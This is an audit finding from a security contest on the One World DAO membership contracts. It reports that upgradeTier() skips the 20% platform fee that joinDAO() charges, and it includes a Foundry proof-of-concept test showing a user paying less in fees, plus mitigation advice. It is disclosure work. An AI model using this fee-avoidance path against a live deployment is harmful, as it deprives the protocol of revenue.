Users can avoid and pay less platform fees by utilizing the MembershipFactory::upgradeTier() function 

Note : This finding was considered non-reward due to it being labelled a design choice. However, broken tokenomics should be considered vulnerability rather than just a design choice. Decided not to appeal due to being busy with work. The protocol was poorly designed with little to no real world purpose, as it contained broken tokenomics and was overly centralized. 

## Summary
In certain DAO tier structures, the users can "skim" the protocol of their platform fees by utilizing the MembershipFactory::upgradeTier() functionality. 

The MembershipFactory contract is the core "backbone" of the protocol. Some of the functionality that this contract provides is the ability to create new Daos, allowing users to join an existing DAO, and allowing users to upgrade their membership tier in an existing DAO they had previously joined. 

The protocol earns their revenue by taking a "platformFee" that is set at 20% of the money a user pays when they join a dao. The money a user pays to join a dao differs by the tier that the user is joining at. Higher tiers give the users a higher number of shares, and therefore usually will cost more money to join. However, this platform fee is not taken when a user upgrades their existing dao membership tier using the MembershipFactory::upgradeTier() function. This works by burning two tokens at the current tier, and then minting a new token at the next tier. Therefore, the protocol will end up earning less in fees in scenarios where it is cost effective for users to mint tokens of a lower tier and upgrading rather than minting a token at that tier directly. This leads to lost revenue for the protocol. 

## Vulnerability Details
The protocol earns revenue using a platform fee that is calculated in the MembershipFactory::joinDAO() function as seen below. 
https://github.com/Cyfrin/2024-11-one-world/blob/1e872c7ab393c380010a507398d4b4caca1ae32b/contracts/dao/MembershipFactory.sol#L137 

```
    /// @notice Allows a user to join a DAO by purchasing a membership NFT at a specific tier
    /// @param daoMembershipAddress The address of the DAO membership NFT
    /// @param tierIndex The index of the tier to join
    function joinDAO(address daoMembershipAddress, uint256 tierIndex) external {
        require(daos[daoMembershipAddress].noOfTiers > tierIndex, "Invalid tier.");
        require(daos[daoMembershipAddress].tiers[tierIndex].amount > daos[daoMembershipAddress].tiers[tierIndex].minted, "Tier full.");
        uint256 tierPrice = daos[daoMembershipAddress].tiers[tierIndex].price;
        uint256 platformFees = (20 * tierPrice) / 100;
        daos[daoMembershipAddress].tiers[tierIndex].minted += 1;
        IERC20(daos[daoMembershipAddress].currency).transferFrom(_msgSender(), owpWallet, platformFees);
        IERC20(daos[daoMembershipAddress].currency).transferFrom(_msgSender(), daoMembershipAddress, tierPrice - platformFees);
        IMembershipERC1155(daoMembershipAddress).mint(_msgSender(), tierIndex, 1);
        emit UserJoinedDAO(_msgSender(), daoMembershipAddress, tierIndex);
    }
```

The protocol does not charge this platform fee on MembershipFactory::upgradeTier(). This can lead to lost potential fees for the protocol in scenarios where it is cheaper for the users to upgrade their daos from a lower tier. 
https://github.com/Cyfrin/2024-11-one-world/blob/1e872c7ab393c380010a507398d4b4caca1ae32b/contracts/dao/MembershipFactory.sol#L155 

```
    /// @notice Allows users to upgrade their tier within a sponsored DAO
    /// @param daoMembershipAddress The address of the DAO membership NFT
    /// @param fromTierIndex The current tier index of the user
    function upgradeTier(address daoMembershipAddress, uint256 fromTierIndex) external {
        require(daos[daoMembershipAddress].daoType == DAOType.SPONSORED, "Upgrade not allowed.");
        require(daos[daoMembershipAddress].noOfTiers >= fromTierIndex + 1, "No higher tier available.");
        IMembershipERC1155(daoMembershipAddress).burn(_msgSender(), fromTierIndex, 2);
        IMembershipERC1155(daoMembershipAddress).mint(_msgSender(), fromTierIndex - 1, 1);
        emit UserJoinedDAO(_msgSender(), daoMembershipAddress, fromTierIndex - 1);
    }
```

## Proof of concept
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "forge-std/Test.sol";
import "../contracts/dao/MembershipFactory.sol";
import "../contracts/dao/interfaces/IERC1155Mintable.sol";
import "../contracts/dao/interfaces/ICurrencyManager.sol";
import "../contracts/dao/libraries/MembershipDAOStructs.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/meta-transaction/NativeMetaTransaction.sol";
import "../contracts/dao/CurrencyManager.sol"; 
import "../contracts/dao/tokens/MembershipERC1155.sol";

import {console} from "forge-std/console.sol";

//Mock Token whitelisted in the currencyToken
contract mockToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("CurrencyToken", "CUR") {
        _mint(msg.sender, initialSupply);
    }
}


contract MembershipFactoryTest is Test {
    MembershipFactory public membershipFactory;
    CurrencyManager public currencyManager;
    ProxyAdmin public proxyAdmin;
    MembershipERC1155 public membershipImplementation;
    address public owpWallet = address(0x123);
    string BaseURI = "BaseURI/";
    ERC20 public currencyToken;

    function setUp() public {
        // 1) Deploy dependencies
        currencyToken = new mockToken(1000000000000000000); 
        vm.prank(owpWallet);
        currencyManager = new CurrencyManager();
        vm.prank(owpWallet);
        currencyManager.addCurrency(address(currencyToken));

        vm.prank(owpWallet);
        membershipImplementation = new MembershipERC1155();

        // 2) Deploy the MembershipFactory contract
        vm.prank(owpWallet);
        membershipFactory = new MembershipFactory(address(currencyManager), 
            owpWallet, BaseURI, address(membershipImplementation)
        );
    }

    function testAvoidPlatformFee() public {
        //1) Create a new DAO with the following structure
        TierConfig memory t0 = TierConfig(100, 100000000, 0, 0);
        TierConfig memory t1 = TierConfig(100, 10000000, 0, 0);
        TierConfig memory t2 = TierConfig(100, 1000000, 0, 0);
        TierConfig memory t3 = TierConfig(100, 100000, 0, 0);
        TierConfig memory t4 = TierConfig(100, 10000, 0, 0);
        TierConfig memory t5 = TierConfig(100, 9000, 0, 0);
        TierConfig memory t6 = TierConfig(100, 1000, 0, 0);

        TierConfig[] memory tiers = new TierConfig[](7);
        tiers[0] = t0;
        tiers[1] = t1;
        tiers[2] = t2;
        tiers[3] = t3;
        tiers[4] = t4;
        tiers[5] = t5;
        tiers[6] = t6;

        DAOInputConfig memory newDAOInputConfig = DAOInputConfig("newDao", DAOType.SPONSORED, address(currencyToken), 700, 7);

        vm.prank(owpWallet);
        address newDAOAddress = membershipFactory.createNewDAOMembership(newDAOInputConfig, tiers);
        MembershipERC1155 newDAO = MembershipERC1155(newDAOAddress);


        //2) Set up our two users. transfer them tokens so they can afford to join the DAO
        address bob = makeAddr("Bob");
        currencyToken.transfer(bob, 9000000000000000);

        address alice = makeAddr("Alice");
        currencyToken.transfer(alice, 9000000000000000);

        //3) Bob mints a tier 5 token
        //   Bob is a good user. Bob does not try and avoid or pay less of the platform fee 
        //   in the process of joining the DAO at a specific tier
        uint256 owpWalletBalanceBefore = currencyToken.balanceOf(owpWallet);
        console.log("owpWallet balance before Bob joinDao(): ", owpWalletBalanceBefore);
        assertEq(owpWalletBalanceBefore, 0);

        vm.prank(bob);
        currencyToken.approve(address(membershipFactory), 1000000);
        vm.prank(bob);
        currencyToken.approve(owpWallet, 1000000);

        vm.prank(bob);
        membershipFactory.joinDAO(newDAOAddress, 5);

        uint256 owpWalletBalanceAfter = currencyToken.balanceOf(owpWallet);
        console.log("owpWallet balance after Bob joinDao(): ", owpWalletBalanceAfter);
        assert(owpWalletBalanceAfter > owpWalletBalanceBefore);
        uint256 platfromFeeFromBob = owpWalletBalanceAfter - owpWalletBalanceBefore;
        console.log("Platform fee from Bob: ", platfromFeeFromBob);


        //4) Alice is a greedy user. Alice wants to avoid paying as much of the platform fee as possible
        vm.prank(alice);
        currencyToken.approve(address(membershipFactory), 1000000);
        vm.prank(alice);
        currencyToken.approve(owpWallet, 1000000);
        owpWalletBalanceBefore = currencyToken.balanceOf(owpWallet);

        //Alice mints two tier 6 tokens
        vm.prank(alice);
        membershipFactory.joinDAO(newDAOAddress, 6);
        vm.prank(alice);
        membershipFactory.joinDAO(newDAOAddress, 6);
        console.log("Alice finishes minting two tier 6 tokens");

        //Alice upgrades her tier 6 tokens into a tier 5 token
        vm.prank(alice);
        membershipFactory.upgradeTier(newDAOAddress, 6);
        owpWalletBalanceAfter = currencyToken.balanceOf(owpWallet);
        uint256 platfromFeeFromAlice = owpWalletBalanceAfter - owpWalletBalanceBefore;
        console.log("Platform fee from Alice: ", platfromFeeFromAlice);

        //5) Alice was able to gain the same tier token as Bob, while contributing less to the protocol in the form of platform fees
        //   This is a loss in potential revenue for the protocol
        assert(platfromFeeFromBob > platfromFeeFromAlice);
        assertEq(newDAO.shareOf(alice), newDAO.shareOf(bob));
    }
```
## Impact
In certain cost structures, the protocol can miss out on potential revenue when it is cheaper for users to upgrade lower tier tokens to higher tier tokens, allowing them to avoid contributing to the platform fee. 

## Tools Used
Foundry
Manual Review

## Recommendations
One potential way to mitigate this problem would be to charge the platform fee on tier upgrades along with on joining a dao. However, this would not fully mitigate the problem as there are still certain cost structures where it would still be beneficial to mint two lower tier tokens and upgrade over directly minting a token at the tier that a user wants. Also charging a platform fee on upgrades can introduce cost structures where it never makes economic sense to upgrade a tier rather than directly minting at a tier. 

My honest recommendation is to just get rid of the tier structure completely. It seems unnecessary for the protocol as the tiers are converted to shares when calculating the profit that a user is entitled to anyways. This protocol would work much better if it used a traditional vault system rather than this tier system. The economics of the tier system are hard to get right, as there will always be an economic advantage to either directly minting a certain tier, or upgrading two of the lower tier nfts. 